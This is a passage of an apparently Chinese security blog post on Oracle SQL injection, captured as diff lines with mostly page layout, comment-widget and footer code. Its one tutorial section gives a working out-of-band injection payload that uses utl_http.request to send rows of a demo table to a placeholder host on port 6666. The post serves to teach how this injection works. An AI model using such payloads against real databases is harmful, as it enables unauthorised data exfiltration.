+<h4 id="0x004-获取DEMO的第四行数据"><a href="#0x004-获取DEMO的第四行数据" class="headerlink" title="0x004 获取DEMO的第四行数据"></a>0x004 获取DEMO的第四行数据</h4><p>payload：?id=-1 and utl_http.request(‘<a target="_blank" rel="noopener" href="http://x.x.x.x:6666/?data=&#39;||">http://x.x.x.x:6666/?data=&#39;||</a>(select cast(id||’<del>‘||name||’</del>‘||sex||’~’||age as varchar(4000)) from (select id,name,sex,age,rownum as LIMIT from demo) where LIMIT=4))=1 – +</p>
+<p> <img src="/Oracle/image-20210719203707676.png" alt="image-20210719203707676"></p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/mongodb/" data-toggle="tooltip" data-placement="top"
+                           title="mongodb数据库注入及注入脚本">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/mssql/" data-toggle="tooltip" data-placement="top"
+                           title="mssql数据库注入---marmot`s Blog">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+
+                
+                    <!-- Valine -->
+                    <div class="vcomments"></div>
+                    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+                    <script src="//cdn.jsdelivr.net/npm/valine"></script>
+                    <script>
+                        var GUEST = ['nick','mail','link'];
+                        var meta = '';
+                        meta = meta.split(',').filter(function (item) {
+                            return GUEST.indexOf(item)>-1;
+                        });
+                        var notify = 'false' == true ? true : false;
+                        var verify = 'false' == true ? true : false;
+                        new Valine({
+                            el: '.vcomments',
+                            notify: notify,
+                            verify: verify,
+                            app_id: "oE8RJ9DO5Tl7ChTtMFwgLKIg-gzGzoHsz",
+                            app_key: "mUbPBB3Wq3R6wX9ysIlescWj",
+                            placeholder: "评论一下",
+                            avatar:"mm",
+                            meta:meta
+                        });
+                    </script>
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-text">Oracle数据库注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#000-Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-text">000 Oracle数据库介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#001-Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E7%82%B9"><span class="toc-text">001 Oracle数据库特点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">Oracle数据库报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#oracle%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5"><span class="toc-text">oracle外带注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">oracle注入中的联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-text">0x001判断数据库类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-%E8%8E%B7%E5%8F%96%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0"><span class="toc-text">0x002 获取查询列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D%E4%BB%A5%E5%8F%8A%E5%90%84%E4%BD%8D%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-text">0x003 判断显示位以及各位的数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x004-%E8%8E%B7%E5%8F%96%E5%88%B0test%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">0x004 获取到test数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x005-%E8%8E%B7%E5%8F%96test%E5%BA%93%E4%B8%8B%E7%9A%84%E8%A1%A8"><span class="toc-text">0x005 获取test库下的表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x006-%E8%8E%B7%E5%8F%96DEMO%E8%A1%A8%E4%B8%8B%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-text">0x006 获取DEMO表下的字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x007-%E8%8E%B7%E5%8F%96DEMO%E8%A1%A8%E7%9A%84%E7%AC%AC%E4%B8%89%E8%A1%8C%E6%95%B0%E6%8D%AE"><span class="toc-text">0x007 获取DEMO表的第三行数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5"><span class="toc-text">oracle注入中的外带数据注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-%E8%8E%B7%E5%8F%96test%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">0x001 获取test数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-%E8%8E%B7%E5%8F%96test%E5%BA%93%E4%B8%8B%E7%9A%84DEMO%E8%A1%A8"><span class="toc-text">0x002 获取test库下的DEMO表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-%E8%8E%B7%E5%8F%96DEMO%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-text">0x003 获取DEMO表中的字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x004-%E8%8E%B7%E5%8F%96DEMO%E7%9A%84%E7%AC%AC%E5%9B%9B%E8%A1%8C%E6%95%B0%E6%8D%AE"><span class="toc-text">0x004 获取DEMO的第四行数据</span></a></li></ol></li></ol></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#Oracle"
+                           title="Oracle">Oracle</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a target="_blank" rel="noopener" href="https://www.zerochen.top">墨的博客</a></li>
+                        
+                        <li><a target="_blank" rel="noopener" href="https://www.sunflowers.vip">sunflowers的博客</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/mar-mot">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; marmot 2021
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/blog.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.marmot.vip/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="/img/marmot.jpg">
+</body>
+
+</html>
